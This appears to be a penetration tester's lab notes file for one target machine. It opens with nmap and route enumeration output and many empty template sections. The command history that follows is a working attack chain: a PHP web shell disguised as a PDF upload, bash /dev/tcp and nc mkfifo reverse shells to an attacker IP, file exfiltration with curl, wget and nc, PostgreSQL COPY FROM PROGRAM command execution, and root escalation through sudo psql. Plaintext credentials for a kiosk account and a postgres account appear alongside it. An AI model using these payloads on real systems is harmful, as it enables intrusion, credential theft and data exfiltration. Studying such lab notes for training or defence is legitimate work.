# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`
`sudo find / -type f -iname "local.txt" 2>/dev/null`    
`sudo find / -type f -iname "proof.txt" 2>/dev/null`
- /local.txt
- /root/proof.txt

# Accounts
### username / password
` `   
`whoami /priv`
```

```
`whoami /groups`
```

```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.207.225 --top-ports 1000`
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8090/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
`sudo nmap -A -T4 -p- <IP>`
```

```
## Local Users
`Get-LocalUser`
```

```
## Local Groups
`Get-LocalGroup`
```

```
## System Info
`systeminfo`
```

```
## Routes
`route print`
`ip route show`
```
default via 192.168.204.254 dev ens192 proto static metric 20100 
169.254.0.0/16 dev ens192 scope link metric 1000 
192.168.204.0/24 dev ens192 proto kernel scope link src 192.168.204.225 metric 100 
```
## Netstat
`netstat -ano`
```

```
## Environment Vars
`Get-ChildItem Env:`
```

```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```

```
# Services    
## API Endpoints
gobuster dir -u http://192.168.204.225 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
`gobuster dir -u http://192.168.133.143:80/api/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
```

```

`gobuster dir -u http://192.168.133.143:80/api/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -b 403`
```
```

`ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.133.143/FUZZ`
```

```
`ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://192.168.133.143/FUZZ`
```
```

# Command History
```c
http://192.168.204.225:8090/backend/default/index.php
admin : admin
echo <?php echo shell_exec($_GET['e'].' 2>&1'); ?> > simplephpwebshell.php
(echo -e "%PDF-1.4\n%âãÏÓ"; cat simplephpwebshell.php) > simple.php
//creates a fake pdf containing php webshell
//upload thru browser

http://192.168.204.225:8090/backend/default/uploads/simple.php?e=whoami
//www-data

nc -lvnp 443
// http://192.168.204.225:8090/backend/default/uploads/simple.php?e=bash+-c+'bash+-i+>&+/dev/tcp/192.168.45.186/443+0>&1'
http://192.168.204.225:8090/backend/default/uploads/simple.php?e=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.45.186/443%200%3E%261%22

//start python 80 server
curl http://192.168.45.186/user-guide-rdweb.pdf --upload-file user-guide-rdweb.pdf
wget --method=PUT --body-file=user-guide-rdweb.pdf http://192.168.45.186/user-guide-rdweb.pdf

nc 192.168.45.186 80 < user-guide-rdweb.pdf

// for .221 -> SKYLARK\kiosk : XEwUS^9R2Gwt8O914

//privesc
// psql -h 127.0.0.1 -p 5432 -U postgres -d webapp
// pass: EAZT5EMULA75F8MC

//PGPASSWORD=EAZT5EMULA75F8MC psql -h localhost -U postgres -d webapp -c '\l'

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
PGPASSWORD=EAZT5EMULA75F8MC psql -h localhost -U postgres -d webapp

nc -lvnp 80
CREATE TABLE shell2(output text);
COPY shell2 FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.186 80 >/tmp/f';

//get shell as postgres
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
sudo psql --host=127.0.0.1 -U postgres
pass: EAZT5EMULA75F8MC
\?
!/bin/bash
//root

```